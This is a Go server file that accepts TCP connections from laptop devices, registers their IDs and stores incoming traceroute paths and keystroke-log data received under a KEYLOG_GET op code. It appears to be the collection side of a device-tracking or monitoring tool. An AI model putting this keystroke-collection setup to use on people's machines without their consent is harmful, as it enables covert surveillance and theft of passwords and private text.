package device

import (
	//"CustomRequest"
	"container/list"
	"fmt"
	"net"
	"strconv"
	//"strings"
)

type laptopHub struct {
	connections map[string]net.Conn
	DeviceBuffer
	mapDeviceQueue chan *deviceConnection
}

type deviceConnection struct {
	ld   LaptopDevice
	conn net.Conn
}

var lh = laptopHub{
	mapDeviceQueue: make(chan *deviceConnection, 20),
	connections:    make(map[string]net.Conn),
}

var deviceConn = new(deviceConnection)

// Open a TCP socket to listen on
func Connect() net.Listener {
	listener, err := net.Listen(CONN_TYPE, CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		return listener
	}
	fmt.Println("Connection created on " + CONN_TYPE + " " + CONN_PORT)
	//defer listener.Close()
	return listener
}

// Listen and accept connections
func Listen(listener net.Listener) {
	//buffer := make([]byte, 1024)
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error connecting", err)
		}
		fmt.Println("Connection established with client")
		go GetDeviceID(conn)
		/*bytesRead, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("Error reading", err)
		}
		bufferString := string(buffer[0:bytesRead])
		fmt.Println(bufferString)*/
		//dID, work := GetDeviceID(conn)
		//dID = dID
		//if !work {
		//	fmt.Println("Error getting device ID")
		//}
		//Read(conn)
		//call go routine here for reading from the now open connection
	}
}

func GetMessage(deviceConn *deviceConnection) {
	buffer := make([]byte, 10240)
	bytesRead, err := deviceConn.conn.Read(buffer)
	if err != nil {
		fmt.Println("Error reading", err)
	}
	msg := string(buffer[0:bytesRead])
	opCode, err := strconv.Atoi(msg[0:1])
	if err != nil {
		fmt.Println("Invalid OP code", err)
	} else {
		switch opCode {
		case TRACE_ROUTE:
			UpdateTraceroute(deviceConn, msg)
		case KEYLOG_GET:
			UpdateKeylog(deviceConn, msg)
		}
	}
}

func UpdateTraceroute(deviceConn *deviceConnection, msg string) {
	newList := new(list.List)
	start := 1
	//ip := new(string)
	for i := 1; i < len(msg)-1; i++ {
		if msg[i:i+1] == "~" {
			newList.PushBack(msg[start:i])
			start = i + 1
		}
	}
	newList.PushBack(msg[start : len(msg)-1]) //to get the final IP address
	deviceConn.ld.TraceRouteList.PushBack(newList)
	for e := newList.Front(); e != nil; e = e.Next() {
		fmt.Println(e.Value)
	}
}

func UpdateKeylog(deviceConn *deviceConnection, msg string) {
	deviceConn.ld.KeylogData.PushBack(msg[1 : len(msg)-1])
	fmt.Println(deviceConn.ld.KeylogData.Back().Value)
}

// Get ID from device
func GetDeviceID(conn net.Conn) { //(string, error) {
	buffer := make([]byte, 10240)
	//ld := new(LaptopDevice)
	bytesRead, err := conn.Read(buffer)
	if err != nil {
		fmt.Println("Error reading device ID", err)
	}
	//ld.ID = string(buffer[0:bytesRead])
	deviceConn := new(deviceConnection)
	deviceConn.ld.ID = string(buffer[0:bytesRead])
	deviceConn.conn = conn
	lh.mapDeviceQueue <- deviceConn
	go GetMessage(deviceConn)
}

// Hash the device to the connection
func MapDeviceID() {
	for {
		dc := <-lh.mapDeviceQueue
		lh.connections[dc.ld.ID] = dc.conn
		fmt.Println(dc.ld.ID)
	}
}
